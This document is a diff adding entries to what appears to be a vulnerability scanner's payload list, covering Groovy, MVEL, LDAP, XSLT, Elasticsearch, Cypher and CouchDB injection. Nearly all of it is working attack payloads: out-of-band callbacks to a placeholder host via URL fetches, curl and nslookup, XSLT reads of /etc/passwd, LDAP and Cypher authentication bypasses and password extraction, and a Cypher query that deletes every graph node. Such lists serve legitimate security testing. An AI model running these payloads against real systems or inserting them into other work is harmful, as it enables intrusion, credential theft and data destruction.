@@ -854,6 +854,20 @@ var x=7*191
 java.lang.Runtime.getRuntime().exec('sleep 5')
 new java.net.URL("http://{domain}/nashorn").openStream()
 var u=new java.net.URL("http://{domain}/graaljs");var c=u.openConnection();c.getInputStream()
+##Groovy Code Injection - Math-Based (Canary: 1337)##
+new GroovyShell().evaluate('7*191')
+"${7*191}"
+##Groovy Code Injection - Timing##
+Thread.sleep(5000)
+new GroovyShell().evaluate('Thread.sleep(5000)')
+##Groovy Code Injection - OOB##
+new URL('http://{domain}/groovy').text
+['curl','http://{domain}/groovy'].execute()
+"http://{domain}/groovy".toURL().text
+##Groovy Code Injection - Error##
+throw new Exception('1337')
+1/0
+new GroovyShell().evaluate('invalid syntax {{{}}}')
 
 ##XSS - Math (1337 reflected via context breakers)##
 "'`><script>alert(1337)</script>
@@ -1204,6 +1218,13 @@ ${T(java.net.URL).new('http://{domain}/eleval').openStream()}
 ${new java.net.URL("http://{domain}/eleval").openStream()}
 ${new java.net.Socket("{domain}",9999)}
 %{(#url=new java.net.URL('http://{domain}/eleval')).(#url.openStream())}
+##MVEL Expression Injection - Timing##
+Runtime.getRuntime().exec("sleep 5")
+##MVEL Expression Injection - OOB##
+Runtime.getRuntime().exec("nslookup {domain}")
+new java.net.URL("http://{domain}/mvel").openStream()
+##MVEL Expression Injection - Error##
+throw new Exception("1337")
 
 ##Prototype Pollution - Math (Canary: 1337)##
 {"__proto__":{"polluted":"1337"}}
@@ -1254,6 +1275,138 @@ String.Format("{0}",1337)
 {.__class__.__init__.__globals__}
 ##Format String - Error (Overflow/Boundary)##
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+##LDAP Injection - Error-Based##
+*)(cn=*))(|(cn=*
+)(objectClass=*
+*)(|(password=*
+)(
+))((
+*))(&(
+(|(cn=*)(cn=*
+*)(cn=*)(|
+*)(&(objectClass=*)(!
+*)(invalidop=*
+##LDAP Injection - Math-Based (Canary: 1337)##
+*)(uid=1337)(&(objectClass=*
+1337)(|(objectClass=*
+*)(cn=1337)(|
+*)(|(uid=1337)(objectClass=*
+*)(description=1337)(&(cn=*
+*)(uid=1337)(cn=*
+##LDAP Injection - Timing-Based##
+*)(|(cn=*a*b*c*d*e*f*g*h*i*j*k*l*m*n*o*p*q*r*s*t*u*v*w*x*y*z*
+*)(|(cn=*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
+*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*
+*)(|(sn=*a*b*c*)(cn=*d*e*f*)(uid=*g*h*i*)(mail=*j*k*l*)(description=*m*n*o*
+##LDAP Injection - OOB##
+*)(objectClass=*))%00
+*)(ref=ldap://{domain}/cn=probe,dc=testbed,dc=local
+*)(objectClass=*)(ref=ldap://{domain}:389/
+*)(cn=*)(|(objectClass=referral)(ref=ldap://{domain}/
+##LDAP Injection - Auth Bypass##
+*)(uid=*))(|(uid=*
+admin)(|(objectClass=*
+*))%00
+admin)(&)
+*)(uid=admin
+admin)(cn=admin))(&(uid=admin
+
+##XSLT Injection - Error-Based##
+<xsl:invalid/>
+<xsl:value-of select="unknown_function()"/>
+<xsl:value-of select="///"/>
+<xsl:value-of select="[invalid xpath"/>
+<xsl:value-of select="concat("/>
+<xsl:template match="###"/>
+<xsl:for-each select="$nonexistent"/>
+##XSLT Injection - Math-Based (Canary: 1337)##
+<xsl:value-of select="7*191"/>
+<xsl:value-of select="1337"/>
+<xsl:value-of select="string(7*191)"/>
+<xsl:value-of select="2674 div 2"/>
+<xsl:value-of select="1338 - 1"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><result><xsl:value-of select="7*191"/></result></xsl:template></xsl:stylesheet>
+##XSLT Injection - OOB##
+<xsl:value-of select="document('http://{domain}/xslt')"/>
+<xsl:copy-of select="document('http://{domain}/xslt')"/>
+<xsl:include href="http://{domain}/xslt.xsl"/>
+<xsl:import href="http://{domain}/xslt.xsl"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('http://{domain}/xslt')"/></xsl:template></xsl:stylesheet>
+##XSLT Injection - File Read##
+<xsl:value-of select="document('/etc/passwd')"/>
+<xsl:copy-of select="document('/etc/passwd')"/>
+<xsl:value-of select="unparsed-text('/etc/passwd')"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+##XSLT Injection - Info Disclosure##
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
+
+##Elasticsearch Injection - Error-Based##
+{"query":{"invalid_query_type":{}}}
+{"query":{"match":{"_all":{"query":"test","invalid_param":true}}}}
+}{
+{"script":{"source":"invalid syntax here"}}
+{"query":{"bool":{"must":[{"match":{"nonexistent_field_xyz":""}}],"invalid_clause":{}}}}
+{"query":{"range":{"id":{"gte":null,"format":"bad"}}}}
+{"size":-1}
+##Elasticsearch Injection - Math-Based (Canary: 1337)##
+{"script_fields":{"x":{"script":"7*191"}}}
+{"script_fields":{"x":{"script":{"source":"return 7*191"}}}}
+{"query":{"script":{"script":{"source":"doc['id'].value == 7*191"}}}}
+{"aggs":{"x":{"sum":{"script":"7*191"}}}}
+{"aggs":{"x":{"bucket_script":{"buckets_path":{},"script":"7*191"}}}}
+{"query":{"function_score":{"script_score":{"script":"7*191"}}}}
+##Elasticsearch Injection - Timing-Based##
+{"query":{"script":{"script":{"source":"Thread.sleep(5000); return true"}}}}
+{"script_fields":{"x":{"script":"Thread.sleep(5000); return 1"}}}
+{"script_fields":{"x":{"script":{"source":"long t=System.currentTimeMillis();while(System.currentTimeMillis()-t<5000){} return 1"}}}}
+{"query":{"regexp":{"name":".*.*.*.*.*.*.*.*.*.*a"}}}
+##Elasticsearch Injection - OOB##
+{"script_fields":{"x":{"script":"new URL('http://{domain}/es').text"}}}
+{"script_fields":{"x":{"script":{"source":"new URL('http://{domain}/es-painless').text"}}}}
+{"script_fields":{"x":{"script":"'http://{domain}/es-rt'.execute().text"}}}
+##Elasticsearch Injection - Query String##
+_exists_:name
+*:*
+name:admin OR _exists_:role
+id:1337 OR id:>0
+name:/.*admin.*/
+
+##Cypher Injection - Error-Based##
+' OR 1=1 //
+') OR 1=1 //
+' UNION MATCH (n) RETURN n //
+') RETURN 1 AS x UNION MATCH (n) RETURN n.password AS x //
+' OR 1=1 WITH n RETURN n //
+') MATCH (n) DETACH DELETE n //
+##Cypher Injection - Math-Based (Canary: 1337)##
+' RETURN 7*191 AS x //
+') RETURN 7*191 AS x //
+' OR 1=1 RETURN 7*191 //
+') OR 1=1 RETURN toInteger(7*191) AS x //
+##Cypher Injection - Timing-Based##
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+') WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+' WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
+') WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
+##Cypher Injection - OOB##
+' CALL apoc.load.json('http://{domain}/cypher') YIELD value RETURN value //
+' LOAD CSV FROM 'http://{domain}/cypher' AS row RETURN row //
+') LOAD CSV FROM 'http://{domain}/cypher' AS row RETURN row //
+' CALL apoc.load.csv('http://{domain}/cypher') YIELD list RETURN list //
+##Cypher Injection - Auth Bypass / Data Extraction##
+' OR '1'='1' //
+admin'//
+' OR 1=1 RETURN u.password //
+') OR 1=1 RETURN u.password AS x //
+
+##CouchDB Injection - Error-Based##
+{"selector":{"$invalid_op":"test"}}
+{"invalid json
+{"selector":{"name":{"$exists":true}},"invalid_field":1}
+{"selector":{"name":{"$elemMatch":{"$invalid":1}}}}
 
 ##Python Pickle P0 - Math (eval 7*191)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
